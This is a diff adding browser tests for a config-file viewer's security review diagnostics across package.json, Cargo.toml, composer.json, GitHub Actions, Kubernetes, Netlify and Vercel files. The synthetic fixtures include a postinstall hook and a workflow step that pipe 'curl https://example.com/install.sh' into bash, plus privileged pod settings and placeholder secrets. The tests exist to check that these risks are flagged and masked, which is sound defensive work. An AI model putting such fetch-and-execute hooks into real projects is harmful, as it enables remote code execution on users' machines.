@@ -21,6 +21,41 @@ export async function run(ctx) {
   const pkgMeta = await page.$eval('#metaBody', (e) => e.textContent);
   if (/Package\s*demo-package/.test(pkgMeta) && /Dependencies\s*4/.test(pkgMeta)) pass('package.json metadata includes package and dependency counts'); else fail('package meta: ' + pkgMeta.replace(/\s+/g, ' ').slice(0, 160));
   await page.click('#metaDrawer [data-close]');
+  const pkgText = await page.$eval('#previewHost .pj-doc', (e) => e.textContent);
+  if (/Dependency Review|broad range|markdown-it|eslint/i.test(pkgText)) pass('package.json review shows broad dependency ranges'); else fail('package review: ' + pkgText.slice(0, 900));
+  const pkgSourceOpen = await page.$eval('#previewHost .pj-doc .kf-source-details', (e) => e.open);
+  if (!pkgSourceOpen) pass('package.json source starts collapsed'); else fail('package.json source should start collapsed');
+  await page.click('#previewHost .pj-doc .pj-scripts .kf-source-link');
+  const pkgJump = await page.$eval('#previewHost .pj-doc', (e) => ({
+    open: e.querySelector('.kf-source-details')?.open || false,
+    highlighted: !!e.querySelector('.kf-source-hit'),
+  }));
+  if (pkgJump.open && pkgJump.highlighted) pass('package.json script click opens and highlights source'); else fail('package source jump: ' + JSON.stringify(pkgJump));
+  const pkgBad = await page.evaluate(async () => {
+    const mod = await import('/types/text/json/known/package-json/render.js');
+    const text = JSON.stringify({
+      name: 'risky-package',
+      scripts: {
+        postinstall: 'curl https://example.com/install.sh | bash',
+        build: 'vite build',
+      },
+      dependencies: {
+        lodash: '*',
+        react: '^18.2.0',
+      },
+      devDependencies: {
+        lodash: '~4.17.21',
+      },
+    }, null, 2);
+    const rendered = (await mod.render({ text })).parentNode;
+    document.body.appendChild(rendered);
+    const out = rendered.textContent;
+    const issues = rendered.querySelector('.kf-issues')?.textContent || '';
+    const open = rendered.querySelector('.kf-source-details')?.open || false;
+    rendered.remove();
+    return { out, issues, open };
+  });
+  if (/lifecycle script|shell download|broad range|duplicate dependency|postinstall|lodash/i.test(pkgBad.out + pkgBad.issues) && !pkgBad.open) pass('package.json lifecycle, shell, duplicate, and broad range diagnostics shown'); else fail('package synthetic diagnostics: ' + JSON.stringify(pkgBad).slice(0, 1000));
   await page.click('#enhanceChip .ec-toggle');
   // Reverting to base JSON now renders a live parentNode (tree + query panel), not an iframe.
   await page.waitForSelector('#previewHost .json-tree .j-key', { timeout: 8000 });
@@ -31,6 +66,26 @@ export async function run(ctx) {
   await page.waitForSelector('#previewHost .pj-doc', { timeout: 12000 });
   const crateHrefs = await page.$$eval('#previewHost .pj-deps a.pj-link', (els) => els.map((a) => a.getAttribute('href')));
   if (crateHrefs.some((h) => /crates\.io\/crates\/serde/.test(h))) pass('Cargo.toml: dependencies link to crates.io'); else fail('crate links: ' + crateHrefs.join(','));
+  const cargoSourceOpen = await page.$eval('#previewHost .pj-doc .kf-source-details', (e) => e.open);
+  if (!cargoSourceOpen) pass('Cargo.toml: source starts collapsed'); else fail('Cargo.toml source should start collapsed');
+  await page.click('#previewHost .pj-doc .pj-deps .kf-source-link');
+  const cargoJump = await page.$eval('#previewHost .pj-doc', (e) => ({
+    open: e.querySelector('.kf-source-details')?.open || false,
+    highlighted: !!e.querySelector('.kf-source-hit'),
+  }));
+  if (cargoJump.open && cargoJump.highlighted) pass('Cargo.toml: dependency click opens and highlights source'); else fail('cargo source jump: ' + JSON.stringify(cargoJump));
+  const cargoBad = await page.evaluate(async () => {
+    const mod = await import('/types/text/toml/known/cargo-toml/render.js');
+    const text = '[package]\nname = "risky"\nversion = "0.1.0"\nedition = "2021"\n\n[dependencies]\nserde = "*"\nshared = "1"\nlocal-lib = { path = "../local-lib" }\nremote-lib = { git = "https://example.com/remote-lib.git", branch = "main" }\n\n[dev-dependencies]\nshared = "1.0"\n';
+    const rendered = (await mod.render({ text, filename: 'Cargo.toml' })).parentNode;
+    document.body.appendChild(rendered);
+    const out = rendered.textContent;
+    const issues = rendered.querySelector('.kf-issues')?.textContent || '';
+    const open = rendered.querySelector('.kf-source-details')?.open || false;
+    rendered.remove();
+    return { out, issues, open };
+  });
+  if (/Cargo Review|broad range|git dependency|path dependency|duplicate dependency|serde|shared|local-lib|remote-lib/i.test(cargoBad.out + cargoBad.issues) && !cargoBad.open) pass('Cargo.toml: broad, git, path, and duplicate dependency diagnostics shown'); else fail('cargo synthetic diagnostics: ' + JSON.stringify(cargoBad).slice(0, 1000));
 
   await openExample('tsconfig.json');
   await page.waitForSelector('#previewHost .ts-table', { timeout: 12000 });
@@ -58,6 +113,16 @@ export async function run(ctx) {
   const composeText = await page.$eval('#previewHost', (e) => e.textContent);
   if (/current directory build context/.test(composeText) && /relative bind/.test(composeText) && /host-local paths/.test(composeText)) pass('docker-compose: build and local bind hints are visible');
   else fail('compose text: ' + composeText.replace(/\s+/g, ' ').slice(0, 220));
+  if (/POSTGRES_PASSWORD=\*{8}/.test(composeText) && !/POSTGRES_PASSWORD=secret/.test(composeText)) pass('docker-compose: secret-like environment values are masked'); else fail('compose secret masking: ' + composeText.replace(/\s+/g, ' ').slice(0, 260));
+  if (/Compose Review/.test(composeText) && /no healthcheck|secret env|published port/i.test(composeText)) pass('docker-compose: review warnings are shown'); else fail('compose review: ' + composeText.replace(/\s+/g, ' ').slice(0, 260));
+  const composeSourceOpen = await page.$eval('#previewHost .kf-source-details', (e) => e.open);
+  if (!composeSourceOpen) pass('docker-compose: source starts collapsed'); else fail('compose source should start collapsed');
+  await page.click('#previewHost .kf-svc h3 .kf-source-link');
+  const composeJump = await page.$eval('#previewHost', (e) => ({
+    open: e.querySelector('.kf-source-details')?.open || false,
+    highlighted: !!e.querySelector('.kf-source-hit'),
+  }));
+  if (composeJump.open && composeJump.highlighted) pass('docker-compose: service click opens and highlights source'); else fail('compose source jump: ' + JSON.stringify(composeJump));
   await page.click('#metaBtn');
   await page.waitForSelector('#metaBody .meta-row', { timeout: 6000 });
   const composeMeta = await page.$eval('#metaBody', (e) => e.textContent);
@@ -96,6 +161,36 @@ export async function run(ctx) {
   await page.waitForSelector('#previewHost .pj-doc', { timeout: 12000 });
   const composerHrefs = await page.$$eval('#previewHost a.pj-link', (els) => els.map((a) => a.getAttribute('href')));
   if (composerHrefs.some((h) => /packagist\.org\/packages\/guzzlehttp\/guzzle/.test(h))) pass('composer.json: dependencies link to Packagist'); else fail('packagist links: ' + composerHrefs.join(','));
+  const composerSourceOpen = await page.$eval('#previewHost .pj-doc .kf-source-details', (e) => e.open);
+  if (!composerSourceOpen) pass('composer.json: source starts collapsed'); else fail('composer source should start collapsed');
+  await page.click('#previewHost .pj-doc .kf-list .kf-source-link');
+  const composerJump = await page.$eval('#previewHost .pj-doc', (e) => ({
+    open: e.querySelector('.kf-source-details')?.open || false,
+    highlighted: !!e.querySelector('.kf-source-hit'),
+  }));
+  if (composerJump.open && composerJump.highlighted) pass('composer.json: dependency click opens and highlights source'); else fail('composer source jump: ' + JSON.stringify(composerJump));
+  const composerBad = await page.evaluate(async () => {
+    const mod = await import('/types/text/json/known/composer-json/render.js');
+    const text = JSON.stringify({
+      name: 'acme/risky',
+      require: {
+        php: '*',
+        'monolog/monolog': 'dev-main',
+        'guzzlehttp/guzzle': '^7.0',
+      },
+      'require-dev': {
+        'guzzlehttp/guzzle': '^7.0',
+      },
+    }, null, 2);
+    const rendered = (await mod.render({ text, filename: 'composer.json' })).parentNode;
+    document.body.appendChild(rendered);
+    const out = rendered.textContent;
+    const issues = rendered.querySelector('.kf-issues')?.textContent || '';
+    const open = rendered.querySelector('.kf-source-details')?.open || false;
+    rendered.remove();
+    return { out, issues, open };
+  });
+  if (/Composer Review|broad range|platform wildcard|moving branch|duplicate dependency|monolog\/monolog|guzzlehttp\/guzzle/i.test(composerBad.out + composerBad.issues) && !composerBad.open) pass('composer.json: broad, platform, branch, and duplicate diagnostics shown'); else fail('composer synthetic diagnostics: ' + JSON.stringify(composerBad).slice(0, 1000));
 
   await openExample('Gemfile');
   await page.waitForSelector('#previewHost .gemfile-doc', { timeout: 12000 });
@@ -162,6 +257,28 @@ export async function run(ctx) {
   if (/GitHub Actions/i.test(ghaText)) pass('GitHub Actions: badge shown'); else fail('gha badge: ' + ghaText.slice(0, 200));
   if (/push|pull.request|workflow.dispatch/i.test(ghaText)) pass('GitHub Actions: triggers shown'); else fail('gha triggers: ' + ghaText.slice(0, 200));
   if (/test|lint|build/i.test(ghaText)) pass('GitHub Actions: jobs shown'); else fail('gha jobs: ' + ghaText.slice(0, 200));
+  if (/Job Graph|needs test, lint|Workflow Review|unpinned action/i.test(ghaText)) pass('GitHub Actions: job graph and risk notes shown'); else fail('gha risk notes: ' + ghaText.slice(0, 900));
+  if (/Dependency Edges|test -> build|lint -> build/i.test(ghaText)) pass('GitHub Actions: dependency edges shown'); else fail('gha dependency edges: ' + ghaText.slice(0, 900));
+  const ghaSourceOpen = await page.$eval('#previewHost .gha-doc .kf-source-details', (e) => e.open);
+  if (!ghaSourceOpen) pass('GitHub Actions: source starts collapsed'); else fail('GitHub Actions source should start collapsed');
+  await page.click('#previewHost .gha-doc .gha-list .kf-source-link');
+  const ghaJump = await page.$eval('#previewHost .gha-doc', (e) => ({
+    open: e.querySelector('.kf-source-details')?.open || false,
+    highlighted: !!e.querySelector('.kf-source-hit'),
+  }));
+  if (ghaJump.open && ghaJump.highlighted) pass('GitHub Actions: item click opens and highlights source'); else fail('gha source jump: ' + JSON.stringify(ghaJump));
+  const ghaBad = await page.evaluate(async () => {
+    const mod = await import('/types/text/yaml/known/github-actions/renderer.js');
+    const text = 'name: risky\non:\n  pull_request_target:\npermissions: write-all\nenv:\n  API_TOKEN: super-secret\njobs:\n  build:\n    needs: missing-job\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: curl https://example.com/install.sh | bash';
+    const rendered = (await mod.render({ text, filename: '.github/workflows/risky.yml' })).parentNode;
+    document.body.appendChild(rendered);
+    const out = rendered.textContent;
+    const issues = rendered.querySelector('.kf-issues')?.textContent || '';
+    const open = rendered.querySelector('.kf-source-details')?.open || false;
+    rendered.remove();
+    return { out, issues, open };
+  });
+  if (/risky trigger|broad permission|unpinned action|shell download|secret env|missing need|missing-job|API_TOKEN|\\*\\*\\*\\*\\*\\*\\*\\*/i.test(ghaBad.out + ghaBad.issues) && !/super-secret/.test(ghaBad.out) && !ghaBad.open) pass('GitHub Actions: risky trigger, permissions, shell, action, missing need, and secret diagnostics shown'); else fail('gha synthetic diagnostics: ' + JSON.stringify(ghaBad).slice(0, 1000));
 
   // ── Kubernetes manifest viewer ──
   await openExample('Kubernetes Deployment manifest (demo)');
@@ -170,6 +287,27 @@ export async function run(ctx) {
   if (/Kubernetes/i.test(k8sText)) pass('Kubernetes: badge shown'); else fail('k8s badge: ' + k8sText.slice(0, 200));
   if (/Deployment/i.test(k8sText)) pass('Kubernetes: kind shown'); else fail('k8s kind: ' + k8sText.slice(0, 200));
   if (/web-app|production/i.test(k8sText)) pass('Kubernetes: name/namespace shown'); else fail('k8s meta: ' + k8sText.slice(0, 200));
+  if (/Containers|nginx:1\.25-alpine|Workload Review|missing healthcheck/i.test(k8sText)) pass('Kubernetes: containers and workload review shown'); else fail('k8s review: ' + k8sText.slice(0, 900));
+  const k8sSourceOpen = await page.$eval('#previewHost .k8s-doc .kf-source-details', (e) => e.open);
+  if (!k8sSourceOpen) pass('Kubernetes: source starts collapsed'); else fail('Kubernetes source should start collapsed');
+  await page.click('#previewHost .k8s-doc .k8s-list .kf-source-link');
+  const k8sJump = await page.$eval('#previewHost .k8s-doc', (e) => ({
+    open: e.querySelector('.kf-source-details')?.open || false,
+    highlighted: !!e.querySelector('.kf-source-hit'),
+  }));
+  if (k8sJump.open && k8sJump.highlighted) pass('Kubernetes: item click opens and highlights source'); else fail('k8s source jump: ' + JSON.stringify(k8sJump));
+  const k8sBad = await page.evaluate(async () => {
+    const mod = await import('/types/text/yaml/known/k8s-manifest/renderer.js');
+    const text = 'apiVersion: v1\nkind: Pod\nmetadata:\n  name: risky-pod\nspec:\n  hostNetwork: true\n  hostPID: true\n  containers:\n    - name: app\n      image: nginx:latest\n      ports:\n        - containerPort: 80\n          hostPort: 8080\n      securityContext:\n        privileged: true\n        allowPrivilegeEscalation: true\n      env:\n        - name: DB_PASSWORD\n          value: super-secret';
+    const rendered = (await mod.render({ text })).parentNode;
+    document.body.appendChild(rendered);
+    const out = rendered.textContent;
+    const issues = rendered.querySelector('.kf-issues')?.textContent || '';
+    const open = rendered.querySelector('.kf-source-details')?.open || false;
+    rendered.remove();
+    return { out, issues, open };
+  });
+  if (/mutable image|privileged|privilege escalation|public bind|hostNetwork|hostPID|missing healthcheck|secret env|DB_PASSWORD|\\*\\*\\*\\*\\*\\*\\*\\*/i.test(k8sBad.out + k8sBad.issues) && !/super-secret/.test(k8sBad.out) && !k8sBad.open) pass('Kubernetes: workload risks and secret masking shown'); else fail('k8s synthetic diagnostics: ' + JSON.stringify(k8sBad).slice(0, 1000));
 
   // ── Kubernetes RBAC viewer ──
   await openExample('k8s-role.yaml');
@@ -241,6 +379,27 @@ export async function run(ctx) {
   if (!ntlText.includes('Netlify')) fail('netlify.toml: missing badge');
   else pass('netlify.toml: badge shown');
   if (/npm run build|dist/i.test(ntlText)) pass('netlify.toml: build command shown'); else fail('netlify build: ' + ntlText.slice(0, 200));
+  if (/Netlify Review|Content-Security-Policy|Strict-Transport-Security|broad rewrite/i.test(ntlText)) pass('netlify.toml: review findings shown'); else fail('netlify review: ' + ntlText.slice(0, 300));
+  const ntlBad = await page.evaluate(async () => {
+    const mod = await import('/types/text/toml/known/netlify/renderer.js');
+    const rendered = (await mod.render({ text: '[build]\ncommand = "npm run build"\npublish = "dist"\n\n[[redircts]]\nfrom = "/*"\nto = "/index.html"\nstatus = 200\n' })).parentNode;
+    document.body.appendChild(rendered);
+    const out = rendered.textContent;
+    const open = rendered.querySelector('.kf-source-details')?.open || false;
+    rendered.remove();
+    return { out, open };
+  });
+  if (/Netlify Review|unknown key|redircts/i.test(ntlBad.out) && !ntlBad.open) pass('netlify.toml: unknown top-level section diagnostic shown'); else fail('netlify unknown key: ' + JSON.stringify(ntlBad).slice(0, 700));
+  const ntlHelpTitle = await page.$eval('.netlifytoml-doc .ntl-link[data-source-line]', (e) => e.getAttribute('title') || '');
+  if (/Netlify|Open line|source/i.test(ntlHelpTitle)) pass('netlify.toml: hover source help shown'); else fail('netlify hover help: ' + ntlHelpTitle);
+  const ntlSourceCollapsed = await page.$eval('.netlifytoml-doc .kf-source-details', (e) => !e.open && /Redacted source/.test(e.textContent));
+  if (ntlSourceCollapsed) pass('netlify.toml: source collapsed'); else fail('netlify source should start collapsed');
+  const ntlSourceLine = await page.$eval('.netlifytoml-doc .ntl-link[data-source-line]', (e) => { e.click(); return e.getAttribute('data-source-line'); });
+  await page.waitForFunction((line) => {
+    const details = document.querySelector('.netlifytoml-doc .kf-source-details');
+    return details?.open && document.getElementById(`netlify-line-${line}`);
+  }, ntlSourceLine, { timeout: 3000 });
+  pass('netlify.toml: source links open source');
 
   // ── Vercel config viewer ──
   await openExample('Vercel config (vercel.json demo)');
@@ -249,6 +408,29 @@ export async function run(ctx) {
   const vclText = await page.$eval('.verceljson-doc', (e) => e.textContent);
   if (/Vercel/i.test(vclText)) pass('vercel.json: badge shown'); else fail('vercel badge: ' + vclText.slice(0, 200));
   if (/nextjs|Next\.js/i.test(vclText)) pass('vercel.json: framework shown'); else fail('vercel framework: ' + vclText.slice(0, 200));
+  if (/Vercel Review|Content-Security-Policy|rewrite|public env|function/i.test(vclText)) pass('vercel.json: review findings shown'); else fail('vercel review: ' + vclText.slice(0, 300));
+  if (!vclText.includes('@api-secret-key') && !vclText.includes('@stripe-token')) pass('vercel.json: secrets masked'); else fail('vercel secrets leaked: ' + vclText.slice(0, 500));
+  const vclBad = await page.evaluate(async () => {
+    const mod = await import('/types/text/json/known/vercel/renderer.js');
+    const text = JSON.stringify({ framework: 'nextjs', rewritse: [{ source: '/(.*)', destination: '/' }] }, null, 2);
+    const rendered = (await mod.render({ text })).parentNode;
+    document.body.appendChild(rendered);
+    const out = rendered.textContent;
+    const open = rendered.querySelector('.kf-source-details')?.open || false;
+    rendered.remove();
+    return { out, open };
+  });
+  if (/Vercel Review|unknown key|rewritse/i.test(vclBad.out) && !vclBad.open) pass('vercel.json: unknown top-level key diagnostic shown'); else fail('vercel unknown key: ' + JSON.stringify(vclBad).slice(0, 700));
+  const vclHelpTitle = await page.$eval('.verceljson-doc .vcl-link[data-source-line]', (e) => e.getAttribute('title') || '');
+  if (/Vercel|Open line|source/i.test(vclHelpTitle)) pass('vercel.json: hover source help shown'); else fail('vercel hover help: ' + vclHelpTitle);
+  const vclSourceCollapsed = await page.$eval('.verceljson-doc .kf-source-details', (e) => !e.open && /Redacted source/.test(e.textContent));
+  if (vclSourceCollapsed) pass('vercel.json: source collapsed'); else fail('vercel source should start collapsed');
+  const vclSourceLine = await page.$eval('.verceljson-doc .vcl-link[data-source-line]', (e) => { e.click(); return e.getAttribute('data-source-line'); });
+  await page.waitForFunction((line) => {
+    const details = document.querySelector('.verceljson-doc .kf-source-details');
+    return details?.open && document.getElementById(`vercel-line-${line}`);
+  }, vclSourceLine, { timeout: 3000 });
+  pass('vercel.json: source links open source');
 
   // ── pyproject.toml viewer ──
   await openExample('pyproject.toml');
